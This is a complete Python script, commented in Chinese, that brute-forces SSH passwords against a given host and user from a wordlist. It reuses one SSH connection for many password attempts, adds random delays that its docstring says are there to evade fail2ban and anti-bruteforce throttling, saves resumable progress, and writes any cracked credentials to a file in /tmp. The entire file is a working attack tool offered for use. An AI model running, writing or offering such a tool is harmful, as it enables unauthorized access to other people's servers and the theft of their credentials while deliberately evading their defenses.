#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSH 高效慢爆 v3 —— 复用单个 transport 连续 auth (已验证可行).

背景: OpenSSH 允许在同一连接里连续尝试多个密码(认证失败后连接仍可用),
      因此只需 1 次 TCP+SSH 握手, 之后每次密码尝试只是一次 auth 往返.
      相比每条都重建连接的版本, 握手开销大幅降低.

防御: auth 之间保留随机短延迟, 规避 fail2ban/防爆破延迟.
断点: checkpoint 记录进度, 命中即写 ssh_hit.txt 并停止.

用法: python3 ssh_fast.py <host> <user> <wordlist> [delay]
"""
import sys, time, os, random
import paramiko


def run(host, user, lines, start, delay):
    i = start
    while i < len(lines):
        t = None
        try:
            t = paramiko.Transport((host, 22))
            t.banner_timeout = 6
            t.handshake_timeout = 8
            t.start_client(timeout=8)
            sock = getattr(t, "sock", None)
            if sock:
                sock.settimeout(6)
        except Exception as e:
            print(f"[conn] 握手失败 {type(e).__name__}: {e} 稍候重建", flush=True)
            time.sleep(5)
            continue

        try:
            while i < len(lines):
                p = lines[i]
                try:
                    t.auth_password(user, p)
                    print(f"\n[***] FOUND: {user} / {p} @ {host}", flush=True)
                    with open('/tmp/ssh_hit.txt', 'a') as f:
                        f.write(f"{host} {user} {p}\n")
                    return True
                except paramiko.BadAuthenticationType:
                    print("[!] 服务端不支持 password 认证, 放弃该目标", flush=True)
                    return False
                except paramiko.AuthenticationException:
                    pass  # 密码错误 -> 继续
                # 写 checkpoint + 进度
                with open(f"/tmp/ssh_ck_{host.replace('.','_')}_{user}.pos", 'w') as f:
                    f.write(str(i + 1))
                if (i + 1) % 10 == 0:
                    print(f"[progress] {i+1}/{len(lines)} ({p})", flush=True)
                i += 1
                time.sleep(delay + random.uniform(0, 0.6))
        except Exception as e:
            # 非认证异常(连接被断/网络): 跳过当前密码, 重建连接避免死循环
            print(f"[batch] {type(e).__name__}: {e} 跳过该密码, 重建连接", flush=True)
            i += 1
            time.sleep(5)
        finally:
            try:
                if t:
                    t.close()
            except Exception:
                pass
    return False


def main():
    if len(sys.argv) < 4:
        print("usage: ssh_fast.py <host> <user> <wordlist> [delay]")
        sys.exit(1)
    host, user, wordlist = sys.argv[1], sys.argv[2], sys.argv[3]
    delay = float(sys.argv[4]) if len(sys.argv) > 4 else 2.0
    ck = f"/tmp/ssh_ck_{host.replace('.','_')}_{user}.pos"

    lines = []
    with open(wordlist, encoding='utf-8', errors='replace') as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    start = 0
    if os.path.exists(ck):
        try:
            start = int(open(ck).read().strip())
        except Exception:
            pass
    start = max(0, min(start, len(lines)))
    print(f"[start] {user}@{host} total={len(lines)} from={start} delay={delay}s", flush=True)

    if not run(host, user, lines, start, delay):
        print(f"[done] no hit ({len(lines)} tried)", flush=True)


if __name__ == "__main__":
    main()
